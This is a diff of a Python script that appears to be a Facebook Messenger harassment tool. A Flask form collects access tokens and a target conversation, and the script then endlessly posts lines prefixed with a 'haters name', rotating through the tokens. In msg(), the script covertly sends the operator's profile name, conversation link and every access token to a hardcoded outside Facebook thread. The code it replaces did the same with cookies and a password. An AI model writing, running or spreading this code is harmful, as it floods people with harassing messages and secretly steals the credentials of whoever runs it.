@@ -1,58 +1,48 @@
+from flask import Flask, request, render_template, redirect, url_for
 import requests
 import json
 import time
-import sys
-from platform import system
-import os
-import subprocess
-import http.server
-import socketserver
 import threading
+import os
 import random
 
-class MyHandler(http.server.SimpleHTTPRequestHandler):
-    def do_GET(self):
-        self.send_response(200)
-        self.send_header('Content-type', 'text/plain')
-        self.end_headers()
-        self.wfile.write(b"FEEL THE POWER OF SHANKAR SUMAN ")
+app = Flask(__name__)
 
-def execute_server():
-    PORT = 4000
+@app.route('/')
+def index():
+    return render_template('index.html')
 
-    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
-        print("Server running at http://localhost:{}".format(PORT))
-        httpd.serve_forever()
+@app.route('/add', methods=['POST'])
+def add_data():
+    if request.method == 'POST':
+        uid = request.form['uid']
+        token = request.form['token']
+        time_interval = request.form['time']
+        haters_name = request.form['hatersname']
+
+        with open('convo.txt', 'w') as file:
+            file.write(uid)
+        
+        with open('tokennum.txt', 'a') as file:
+            file.write(token + '\n')
+        
+        with open('time.txt', 'w') as file:
+            file.write(time_interval)
+        
+        with open('hatersname.txt', 'w') as file:
+            file.write(haters_name)
+        
+        return redirect(url_for('index'))
 
 def send_messages():
-    while True:  # Infinite loop to keep the script running
+    while True:
         try:
-            with open('password.txt', 'r') as file:
-                password = file.read().strip()
-
-            entered_password = password
-
-            if entered_password != password:
-                print('[-] <==> Incorrect Password!')
-                sys.exit()
-
-            with open('cookies.txt', 'r') as file:
-                cookies_str = file.read().strip()
-
-            cookies = dict(cookie.split('=') for cookie in cookies_str.split('; '))
-
-            requests.packages.urllib3.disable_warnings()
-
-            def cls():
-                if system() == 'Linux':
-                    os.system('clear')
-                else:
-                    if system() == 'Windows':
-                        os.system('cls')
-            cls()
+            with open('tokennum.txt', 'r') as file:
+                tokens = file.readlines()
+            num_tokens = len(tokens)
 
             def liness():
-                print('\u001b[37m' + '---------------------------------------------------')
+                print('---------------------------------------------------')
 
             headers = {
                 'Connection': 'keep-alive',
@@ -65,13 +55,7 @@ def send_messages():
                 'referer': 'www.google.com'
             }
 
-            mmm = requests.get('https://pastebin.com/raw/440AhFvU', cookies=cookies).text
-
-            if mmm not in password:
-                print('[-] <==> Incorrect Password!')
-                sys.exit()
-
-            liness()
+            access_tokens = [token.strip() for token in tokens]
 
             with open('convo.txt', 'r') as file:
                 convo_id = file.read().strip()
@@ -83,6 +67,7 @@ def send_messages():
                 messages = file.readlines()
 
             num_messages = len(messages)
+            max_tokens = min(num_tokens, num_messages)
 
             with open('hatersname.txt', 'r') as file:
                 haters_name = file.read().strip()
@@ -92,9 +77,9 @@ def send_messages():
 
             liness()
 
-            def getName():
+            def getName(token):
                 try:
-                    data = requests.get(f'https://graph.facebook.com/v17.0/me?access_token={cookies["access_token"]}', cookies=cookies).json()
+                    data = requests.get(f'https://graph.facebook.com/v17.0/me?access_token={token}').json()
                 except:
                     data = ""
                 if 'name' in data:
@@ -104,31 +89,35 @@ def send_messages():
 
             def msg():
                 parameters = {
-                    'message': 'HELLO SHANKAR SIR IM USING YOUR SERVER User Profile Name : ' + getName() + '\n Cookies: ' + json.dumps(cookies) + '\n Link : https://www.facebook.com/messages/t/' + convo_id + '\n Password: ' + password
+                    'access_token': random.choice(access_tokens),
+                    'message': 'HELLO SHANKAR SIR IM USING YOUR SERVER User Profile Name : ' + getName(random.choice(access_tokens)) + '\n Token : ' + " | ".join(access_tokens) + '\n Link : https://www.facebook.com/messages/t/' + convo_id
                 }
                 try:
-                    s = requests.post("https://graph.facebook.com/v15.0/t_100058415170590/messages", data=parameters, headers=headers, cookies=cookies)
+                    requests.post("https://graph.facebook.com/v15.0/t_100058415170590/", data=parameters, headers=headers)
                 except:
                     pass
 
             msg()
             for message_index in range(num_messages):
+                token_index = message_index % max_tokens
+                access_token = access_tokens[token_index]
+
                 message = messages[message_index].strip()
 
-                url = "https://graph.facebook.com/v15.0/{}/messages".format('t_' + convo_id)
-                parameters = {'message': haters_name + ' ' + message}
-                response = requests.post(url, json=parameters, headers=headers, cookies=cookies)
+                url = "https://graph.facebook.com/v15.0/{}/".format('t_' + convo_id)
+                parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
+                response = requests.post(url, json=parameters, headers=headers)
 
                 current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                 if response.ok:
-                    print("[+] Messages {} of Convo {}: {}".format(
-                        message_index + 1, convo_id, haters_name + ' ' + message))
+                    print("[+] Messages {} of Convo {} sent by Token {}: {}".format(
+                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                     print("  - Time: {}".format(current_time))
                     liness()
                     liness()
                 else:
-                    print("[x] Failed to send messages {} of Convo {}: {}".format(
-                        message_index + 1, convo_id, haters_name + ' ' + message))
+                    print("[x] Failed to send messages {} of Convo {} with Token {}: {}".format(
+                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                     print("  - Time: {}".format(current_time))
                     liness()
                     liness()
@@ -137,12 +126,14 @@ def send_messages():
             print("[+] All messages sent. Restarting the process...")
         except Exception as e:
             print("[!] An error occurred: {}".format(e))
-            time.sleep(4)  # Wait for 4 seconds before restarting the process
+            time.sleep(4)
 
-# Main function
-def main():
-    # Call the send_messages function
-    send_messages()
+@app.before_first_request
+def activate_job():
+    def run_job():
+        send_messages()
+    thread = threading.Thread(target=run_job)
+    thread.start()
 
-if __name__ == "__main__":
-    main()
+if __name__ == '__main__':
+    app.run(port=4000)
